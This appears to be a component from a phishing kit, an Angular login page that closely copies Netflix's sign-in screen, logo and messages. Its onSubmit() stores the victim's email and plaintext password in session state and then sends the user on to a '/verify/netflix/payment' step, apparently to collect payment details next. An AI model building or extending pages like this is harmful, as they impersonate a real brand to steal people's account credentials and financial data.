import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';

@Component({
  selector: 'app-netflix-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="netflix-flow-container login-mode">
      <header class="netflix-header">
        <img src="/assets/flows/netflix/images/logo.svg" alt="Netflix" class="netflix-logo">
      </header>

      <div class="netflix-login-card">
        <h1 class="netflix-title">Sign In</h1>
        
        <form [formGroup]="loginForm" (ngSubmit)="onSubmit()">
          <!-- Email Input -->
          <div class="nf-input-container" [class.has-value]="!!loginForm.get('email')?.value">
            <input 
              type="text" 
              id="email" 
              formControlName="email" 
              class="nf-input"
              [class.error]="isFieldInvalid('email')"
            >
            <label for="email" class="nf-label">Email or mobile number</label>
            <div *ngIf="isFieldInvalid('email')" class="nf-error-msg">
              Please enter a valid email or phone number.
            </div>
          </div>

          <!-- Password Input -->
          <div class="nf-input-container" [class.has-value]="!!loginForm.get('password')?.value">
            <input 
              [type]="showPassword() ? 'text' : 'password'" 
              id="password" 
              formControlName="password" 
              class="nf-input"
              [class.error]="isFieldInvalid('password')"
            >
            <label for="password" class="nf-label">Password</label>
            
            <!-- Custom toggle inside input if needed, or just leave standard -->
             <div *ngIf="isFieldInvalid('password')" class="nf-error-msg">
              Your password must contain between 4 and 60 characters.
            </div>
          </div>

          <button 
            type="submit" 
            class="nf-btn-primary"
            [disabled]="loginForm.invalid || isLoading()"
          >
            {{ isLoading() ? 'Signing in...' : 'Sign In' }}
          </button>

          <div class="nf-helper-text">
            <span>
              <input type="checkbox" id="rememberMe" checked>
              <label for="rememberMe" style="margin-left: 5px; color: #b3b3b3;">Remember me</label>
            </span>
            <a href="javascript:void(0)">Need help?</a>
          </div>
        </form>

        <div class="nf-signup-now">
          New to Netflix? <a href="javascript:void(0)" style="color: #fff;">Sign up now</a>.
        </div>
        
        <div class="nf-recaptcha-text">
          This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="javascript:void(0)" style="color: #0071eb; text-decoration: none;">Learn more</a>.
        </div>
      </div>
    </div>
  `,
  styleUrls: ['../../../styles/flows/netflix.scss']
})
export class NetflixLoginComponent {
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private state = inject(StateService);

  loginForm = this.fb.group({
    email: ['', [Validators.required, Validators.minLength(4)]],
    password: ['', [Validators.required, Validators.minLength(4), Validators.maxLength(60)]]
  });

  isLoading = signal(false);
  showPassword = signal(false);

  constructor() {
    const flow = getFlowById('netflix');
    if (flow) this.state.currentFlow.set(flow);
  }

  isFieldInvalid(field: string): boolean {
    const control = this.loginForm.get(field);
    return !!(control && control.invalid && (control.dirty || control.touched));
  }

  onSubmit() {
    if (this.loginForm.valid) {
      this.isLoading.set(true);
      const { email, password } = this.loginForm.value;

      this.state.updateSession({
        email,
        password,
        currentStep: 'plan-selection',
        flow: 'netflix'
      });

      setTimeout(() => {
        this.isLoading.set(false);
        this.router.navigate(['/verify/netflix/payment']);
      }, 1500);
    } else {
      this.loginForm.markAllAsTouched();
    }
  }
}
